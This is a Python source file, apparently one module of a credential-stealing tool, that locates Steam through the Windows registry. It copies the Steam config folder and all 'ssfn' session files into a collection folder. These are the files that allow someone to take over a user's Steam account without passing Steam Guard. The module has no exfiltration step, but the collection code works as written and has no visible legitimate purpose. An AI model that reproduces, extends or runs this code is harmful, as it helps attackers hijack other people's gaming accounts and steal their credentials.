from re import findall
from shutil import copy
from os import listdir, makedirs, path
from typing import Optional
from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_32KEY


class Steam:
    """
    Collects configs from the Steam.
    """
    def __init__(self, storage_path: str, folder: str):

        self.__full_path = path.join(storage_path, folder)

    def __create_folder(self) -> None:
        """
        Creates storage for the Steam module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not path.exists(self.__full_path):
            makedirs(self.__full_path)

    @staticmethod
    def __get_steam_path() -> Optional[str]:
        """
        Gets the Steam installation path from the registry.

        Parameters:
        - None.

        Returns:
        - str|None: Steam installation path if found.
        """
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam")
        except FileNotFoundError:
            key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam", 0, KEY_READ | KEY_WOW64_32KEY)

        value, _ = QueryValueEx(key, "InstallPath")

        if path.exists(value):
            return value

        return None

    def __get_steam_files(self) -> None:
        """
        Collects configs from the Steam.

        Parameters:
        - None.

        Returns:
        - None.
        """
        steam_path = self.__get_steam_path()

        if not steam_path:
            print(f"[Steam]: No steam found")
            return

        configs = [file for file in listdir(rf"{steam_path}\config") if file != "avatarcache"]

        for config in configs:
            copy(rf"{steam_path}\config\{config}", self.__full_path)

        ssfns = sum([findall(r"ssfn.*", file) for file in listdir(steam_path)], [])

        for ssfn in ssfns:
            copy(rf"{steam_path}\{ssfn}", self.__full_path)

    def run(self) -> None:
        """
        Launches the Steam collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__create_folder()
            self.__get_steam_files()

        except Exception as e:
            print(f"[Steam]: {repr(e)}")
